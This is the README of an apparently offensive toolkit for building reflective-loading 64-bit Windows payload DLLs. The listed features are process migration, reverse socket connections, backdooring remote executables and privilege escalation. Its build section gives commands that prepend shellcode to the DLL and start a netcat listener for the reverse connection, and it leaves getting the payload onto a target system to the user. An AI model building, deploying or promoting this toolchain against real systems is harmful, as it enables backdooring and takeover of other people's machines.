Framework
=========

A framework for writing custom 64-bit Win32 payloads
in the form of a dll.

The framework provides some userspace tools for
the payloads:

 * Reflective loading
 * Process migration
 * Reverse socket conections
 
Several demo extension have been writen to do
a variety of tasks:

 * Backdoor DLLs and EXEs on remote host
 * Privledge elavation
 * Manipulate files
 * Manipulate processes
 

Building
--------

You will need:

 * Cygwin (64 bit) -- make, mingw64-x86_64-gcc-g++
 * Ruby (Cygwin's or native Window's version, doesn't matter)
 * Git (well duh)
 * Netcat
 * Nasm
 
Fire up cygwin

    git clone https://github.com/floomby/framework.git
    cd framework

Edit config.h to suit your need. The comments explain things.

    make dll

This builds frameserv.dll. It is up to you to get
it running on a target system. There is shellcode
in the shellcode directory to help you get started.

Assuming RPORT => 1234 and RHOST => localhost you
can do the following

    make tools
    cd shellcode/loader
    make
    ./loader | ruby >sc && cat ../../frameserv.dll >>sc
    (../../tools/sc-test/sc-test sc &) && nc -k -l 1234
    
Usage
-----

COMING SOON

Bugs
----

Right now I am aware of two bugs, both are minor

 * memory is not freeded properly on migration out of process
 * sc-test stays running for a couple minutes when launched as
   described in the instructions, this is due to it waiting
   for all the windsock threads to terminate before exiting
